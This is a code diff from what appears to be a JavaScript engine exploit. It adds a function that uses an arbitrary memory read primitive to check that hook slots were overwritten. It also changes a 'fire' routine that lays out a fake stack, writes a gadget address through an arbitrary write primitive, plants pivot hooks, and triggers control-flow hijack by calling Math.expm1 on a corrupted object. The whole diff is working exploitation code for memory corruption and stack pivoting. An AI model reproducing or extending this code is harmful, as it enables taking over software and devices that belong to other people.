@@ -432,6 +432,25 @@ export function bisectHookPivotMulti(p, prep, hookOffs) {
     return saved;
 }
 
+/** Read back hook slots — confirms write8 stuck before expm1 (survives fast OOM). */
+export function verifyPivotHookWrites(p, prep, hookOffs) {
+    const rows = [];
+    if (!prep || !prep.pivotCell || !prep.M)
+        return { ok: false, okCount: 0, rows, want: null };
+    const want = prep.M.S;
+    hookOffs = hookOffs || G0_HOOK_OFFS;
+    let okCount = 0;
+    for (let i = 0; i < hookOffs.length; i++) {
+        const off = hookOffs[i];
+        let peek = null;
+        try { peek = p.read8(prep.pivotCell.add32(off)); } catch (_) { peek = null; }
+        const match = peek != null && String(peek) === String(want);
+        if (match) okCount++;
+        rows.push({ off, peek, want, ok: match });
+    }
+    return { ok: okCount > 0, okCount, rows, want };
+}
+
 function writePivotHook(p, prep, off) {
     const site = pivotHookCell(prep, off);
     if (!prep._bisect) prep._bisect = {};
@@ -513,14 +532,18 @@ export function bisectPreflight(p, prep) {
 }
 
 /** chain_poops callAddr — layout + arm G0 + multi-hook + expm1. */
-export function bisectFirePoopsStyle(p, prep, hookOffs) {
+export function bisectFirePoopsStyle(p, prep, hookOffs, opts) {
     if (!prep || !prep.M || !prep.G || !prep.pivotObj || !prep.mainMf)
         throw new Error("bisectFirePoopsStyle: no prep");
     hookOffs = hookOffs || G0_HOOK_OFFS;
-    layoutSmokeStack(prep);
-    p.write8(prep.mainMf, prep.G.G0);
-    prep.mainArmed = true;
-    bisectHookPivotMulti(p, prep, hookOffs);
+    opts = opts || {};
+    if (!opts.skipSetup) {
+        layoutSmokeStack(prep);
+        p.write8(prep.mainMf, prep.G.G0);
+        prep.mainArmed = true;
+    }
+    if (!opts.skipHook)
+        bisectHookPivotMulti(p, prep, hookOffs);
     Math.expm1(prep.pivotObj);
     return prep.M.frameDv.getUint32(0, true) | 0;
 }
